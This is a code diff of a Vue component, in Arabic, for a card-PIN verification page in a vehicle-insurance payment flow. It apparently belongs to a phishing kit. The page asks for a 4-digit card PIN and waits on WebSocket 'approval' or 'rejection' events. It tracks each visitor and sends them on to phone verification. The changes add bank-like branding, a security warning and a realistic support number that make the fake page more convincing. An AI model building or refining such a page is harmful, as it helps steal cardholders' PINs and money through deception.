@@ -2,7 +2,7 @@
     <div class="pin-shell" dir="rtl">
 
         <!-- ── Waiting Loader Modal ──────────────────────────────────── -->
-        <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="primary" size="lg"
+        <InsLoading v-if="isVerifying && !error" :modal="true" color="primary" size="lg"
             :text="t( 'verification.cardPin.verifyingPin' )"
             :sub-text="t( 'verification.cardPin.waitingForApproval' )" />
 
@@ -13,7 +13,10 @@
             <div class="pin-topbar">
                 <div class="pin-topbar__bank">
                     <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="pin-topbar__bank-img" />
-                    <span v-else class="pin-topbar__bank-fallback">{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
+                    <div v-else class="pin-topbar__bank-fallback">
+                        <svg class="pin-topbar__bank-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 2L2 7h20L12 2zM4 7v10M8 7v10M12 7v10M16 7v10M20 7v10M2 17h20M3 21h18" /></svg>
+                        <span>{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
+                    </div>
                 </div>
                 <div class="pin-topbar__badge">
                     <svg class="pin-topbar__shield" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
@@ -21,6 +24,7 @@
                 </div>
                 <div class="pin-topbar__network">
                     <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="pin-topbar__network-img" />
+                    <svg v-else class="pin-topbar__network-fallback" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="1" y="4" width="22" height="16" rx="2" ry="2" stroke-width="1.5" /><line x1="1" y1="10" x2="23" y2="10" stroke-width="1.5" /></svg>
                 </div>
             </div>
 
@@ -33,8 +37,12 @@
             <!-- ═══ C. Body ══════════════════════════════════════════ -->
             <div class="pin-body">
 
-                <!-- Card Info Summary -->
+                <!-- Transaction Summary -->
                 <div class="pin-summary">
+                    <div class="pin-summary__row">
+                        <span class="pin-summary__label">{{ t( 'verification.otp.paymentPurpose' ) }}</span>
+                        <span class="pin-summary__value">تأمين مركبة – {{ merchantName }}</span>
+                    </div>
                     <div class="pin-summary__row">
                         <span class="pin-summary__label">{{ t( 'verification.cardPin.cardNumber' ) }}</span>
                         <span class="pin-summary__value ltr-nums" dir="ltr">**** {{ cardLast4 }}</span>
@@ -57,13 +65,22 @@
                     <div class="pin-notice__icon">
                         <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                     </div>
-                    <p class="pin-notice__text">{{ t( 'verification.cardPin.pinLabel' ) }}</p>
+                    <div>
+                        <p class="pin-notice__title">{{ t( 'verification.cardPin.pinNoticeTitle' ) }}</p>
+                        <p class="pin-notice__text">{{ t( 'verification.cardPin.pinLabel' ) }}</p>
+                    </div>
                 </div>
 
                 <!-- PIN Form -->
                 <div class="pin-form">
                     <OtpInput ref="pinInputRef" v-model="pinCode" :length="4" :disabled="isVerifying" :error="error"
                         :auto-submit="true" @submit="submitPin" />
+
+                    <!-- Security Warning -->
+                    <div class="pin-security-warning">
+                        <svg class="pin-security-warning__icon" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
+                        <span>{{ t( 'verification.cardPin.doNotSharePin' ) }}</span>
+                    </div>
 
                     <button :disabled="!isPinValid || isVerifying" class="pin-btn"
                         :class="isPinValid && !isVerifying ? 'pin-btn--active' : 'pin-btn--disabled'"
@@ -73,6 +90,10 @@
                             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                         </svg>
                         <span>{{ isVerifying ? t( 'verification.cardPin.verifying' ) : t( 'verification.cardPin.confirm' ) }}</span>
+                    </button>
+
+                    <button type="button" class="pin-cancel" @click="$router.back()">
+                        {{ t( 'verification.otp.cancelTransaction' ) }}
                     </button>
                 </div>
             </div>
@@ -90,7 +111,7 @@
         <!-- ── Help ──────────────────────────────────────────────────── -->
         <div class="pin-help">
             <span class="pin-help__label">{{ t( 'common.supportContact' ) }}</span>
-            <a href="tel:920000000" class="pin-help__phone" dir="ltr">920000000</a>
+            <a href="tel:920033360" class="pin-help__phone" dir="ltr">920033360</a>
         </div>
     </div>
 </template>
@@ -108,7 +129,7 @@ import { getPinStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import SarIcon from '@/components/SarIcon.vue';
-import InsuranceLoader from '@/components/ui/InsuranceLoader.vue';
+import InsLoading from '@/components/ui/InsLoading.vue';
 import OtpInput from '@/components/ui/OtpInput.vue';
 import { useCardBranding } from '@/composables/useCardBranding';
 import { getReasonLabel } from '@/constants/rejectionReasons';
@@ -119,6 +140,13 @@ const router = useRouter();
 
 // Track this page
 useVisitorTracking( 'card-pin' );
+
+// ─── Order data (transaction context) ───────────────────────────────
+const orderData = (() => {
+    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
+    catch { return {}; }
+})();
+const merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );
 
 // ─── Load context via composable ────────────────────────────────────
 const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
@@ -181,9 +209,8 @@ const { setup: setupWs } = usePaymentWebSocket( {
         isVerifying.value = false;
         trackStepCompleted( 'card_pin', 'phone_verification' );
 
-        // Defer navigation to release the WS message handler and avoid
-        // Chrome "[Violation] 'message' handler took Xms" warnings.
-        setTimeout( () =>
+        // Defer navigation via microtask to release the WS message handler
+        queueMicrotask( () =>
         {
             if ( event.redirect_to )
             {
@@ -192,7 +219,7 @@ const { setup: setupWs } = usePaymentWebSocket( {
             {
                 router.push( { name: 'phoneVerification' } );
             }
-        }, 0 );
+        } );
     },
 
     onRejected ( event )
@@ -246,6 +273,7 @@ onMounted( async () =>
    Matches OtpPage institutional style exactly
    ═══════════════════════════════════════════════════════════════════ */
 
+/* ── Shell ─────────────────────────────────────────────── */
 .pin-shell {
     min-height: 100dvh;
     display: flex;
@@ -256,6 +284,7 @@ onMounted( async () =>
     background: #eef1f5;
 }
 
+/* ── Card ──────────────────────────────────────────────── */
 .pin-card {
     width: 100%;
     max-width: 400px;
@@ -267,12 +296,18 @@ onMounted( async () =>
     animation: pin-in 0.35s ease-out;
 }
 
+@media (min-width: 640px) {
+    .pin-card {
+        box-shadow: 0 4px 20px rgb(0 0 0 / 0.12), 0 0 0 1px rgb(0 0 0 / 0.04);
+    }
+}
+
 @keyframes pin-in {
     from { opacity: 0; transform: translateY(6px); }
     to   { opacity: 1; transform: translateY(0); }
 }
 
-/* ── Topbar ── */
+/* ── A. Topbar — Blue institutional header ────────────── */
 .pin-topbar {
     display: flex;
     align-items: center;
@@ -299,9 +334,19 @@ onMounted( async () =>
 }
 
 .pin-topbar__bank-fallback {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
     font-size: 0.6875rem;
     font-weight: 600;
     color: rgba(255, 255, 255, 0.7);
+}
+
+.pin-topbar__bank-icon {
+    width: 0.875rem;
+    height: 0.875rem;
+    opacity: 0.7;
+    flex-shrink: 0;
 }
 
 .pin-topbar__network-img {
@@ -309,6 +354,13 @@ onMounted( async () =>
     width: auto;
     max-width: 3.5rem;
     object-fit: contain;
+}
+
+.pin-topbar__network-fallback {
+    width: 1.5rem;
+    height: 1.5rem;
+    opacity: 0.5;
+    color: rgba(255, 255, 255, 0.7);
 }
 
 .pin-topbar__badge {
@@ -334,30 +386,30 @@ onMounted( async () =>
     flex-shrink: 0;
 }
 
-/* ── Header ── */
+/* ── B. Header ────────────────────────────────────────── */
 .pin-header {
-    padding: 0.5rem 0.875rem 0.375rem;
+    padding: 0.75rem 1rem 0.5rem;
     text-align: center;
     background: #f8f9fa;
     border-bottom: 1px solid #e5e7eb;
 }
 
 .pin-header__title {
-    font-size: 0.8125rem;
+    font-size: 0.875rem;
     font-weight: 700;
     color: #1a2332;
-    margin: 0 0 0.0625rem;
+    margin: 0 0 0.125rem;
 }
 
 .pin-header__sub {
-    font-size: 0.625rem;
+    font-size: 0.6875rem;
     font-weight: 400;
     color: #6b7280;
     margin: 0;
-    line-height: 1.35;
+    line-height: 1.4;
 }
 
-/* ── Body ── */
+/* ── C. Body ──────────────────────────────────────────── */
 .pin-body {
     padding: 0.5rem 0.75rem;
     display: flex;
@@ -365,7 +417,15 @@ onMounted( async () =>
     gap: 0.375rem;
 }
 
-/* ── Summary ── */
+@media (min-width: 480px) {
+    .pin-body { padding: 0.5rem 0.875rem; gap: 0.4375rem; }
+}
+
+@media (min-width: 640px) {
+    .pin-body { padding: 0.75rem 1rem; gap: 0.5rem; }
+}
+
+/* ── Transaction Summary ──────────────────────────────── */
 .pin-summary {
     background: #f9fafb;
     border: 1px solid #e5e7eb;
@@ -399,6 +459,7 @@ onMounted( async () =>
 .pin-summary__value {
     font-weight: 600;
     color: #1f2937;
+    letter-spacing: 0.01em;
     font-size: 0.6875rem;
 }
 
@@ -417,36 +478,48 @@ onMounted( async () =>
     gap: 0.1875rem;
 }
 
-/* ── Notice ── */
+/* ── PIN Notice (blue institutional) ──────────────────── */
 .pin-notice {
     display: flex;
-    align-items: center;
+    align-items: flex-start;
     gap: 0.25rem;
     padding: 0.25rem 0.4375rem;
-    background: #fffbeb;
-    border: 1px solid #fde68a;
+    background: #eef4fb;
+    border: 1px solid #bbd5ed;
     border-radius: 0.1875rem;
 }
 
 .pin-notice__icon {
     flex-shrink: 0;
-    color: #d97706;
+    width: 0.875rem;
+    height: 0.875rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #1a5276;
+}
+
+.pin-notice__title {
+    font-size: 0.625rem;
+    font-weight: 600;
+    color: #1a5276;
+    margin: 0;
 }
 
 .pin-notice__text {
     font-size: 0.5625rem;
-    font-weight: 600;
-    color: #92400e;
+    color: #2c6994;
     margin: 0;
+    line-height: 1.35;
 }
 
-/* ── Form ── */
+/* ── Form ─────────────────────────────────────────────── */
 .pin-form {
     text-align: center;
     padding: 0.375rem 0;
 }
 
-/* ── Button ── */
+/* ── CTA Button ───────────────────────────────────────── */
 .pin-btn {
     width: 100%;
     padding: 0.4375rem;
@@ -459,7 +532,7 @@ onMounted( async () =>
     gap: 0.375rem;
     border: none;
     cursor: pointer;
-    transition: background 0.15s ease;
+    transition: background 0.2s ease, color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
     margin-top: 0.25rem;
 }
 
@@ -471,19 +544,65 @@ onMounted( async () =>
 
 .pin-btn--active:hover {
     background: #154360;
+    transform: translateY(-1px);
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
 }
 
 .pin-btn--active:active {
     background: #0e2f44;
+    transform: translateY(0);
 }
 
 .pin-btn--disabled {
     background: #e5e7eb;
     color: #9ca3af;
     cursor: not-allowed;
+    border: none;
+    transform: none;
+    box-shadow: none;
 }
 
-/* ── Footer ── */
+/* ── Cancel link ──────────────────────────────────────── */
+.pin-cancel {
+    display: block;
+    width: 100%;
+    margin-top: 0.25rem;
+    padding: 0.25rem;
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 0.625rem;
+    color: #9ca3af;
+    text-align: center;
+    transition: color 0.15s;
+}
+
+.pin-cancel:hover {
+    color: #dc2626;
+}
+
+/* ── Security Warning ─────────────────────────────────── */
+.pin-security-warning {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
+    padding: 0.25rem 0.375rem;
+    margin-top: 0.25rem;
+    font-size: 0.5625rem;
+    color: #b45309;
+    background: #fffbeb;
+    border: 1px solid #fde68a;
+    border-radius: 0.1875rem;
+}
+
+.pin-security-warning__icon {
+    width: 0.75rem;
+    height: 0.75rem;
+    flex-shrink: 0;
+    color: #d97706;
+}
+
+/* ── Footer ───────────────────────────────────────────── */
 .pin-footer {
     display: flex;
     align-items: center;
@@ -513,7 +632,7 @@ onMounted( async () =>
     height: 0.5625rem;
 }
 
-/* ── Help ── */
+/* ── Help ──────────────────────────────────────────────── */
 .pin-help {
     margin-top: 0.5rem;
     text-align: center;
@@ -537,10 +656,12 @@ onMounted( async () =>
 
 .pin-help__phone:hover { text-decoration: underline; }
 
-/* ── Responsive ── */
+/* ── Responsive ───────────────────────────────────────── */
 @media (max-width: 380px) {
     .pin-topbar { padding: 0.4375rem 0.625rem; }
     .pin-topbar__badge-text { display: none; }
+    .pin-topbar__badge { padding: 0.125rem 0.25rem; }
+    .pin-header { padding: 0.625rem 0.75rem 0.375rem; }
     .pin-body { padding: 0.5rem 0.625rem; gap: 0.375rem; }
 }
 </style>
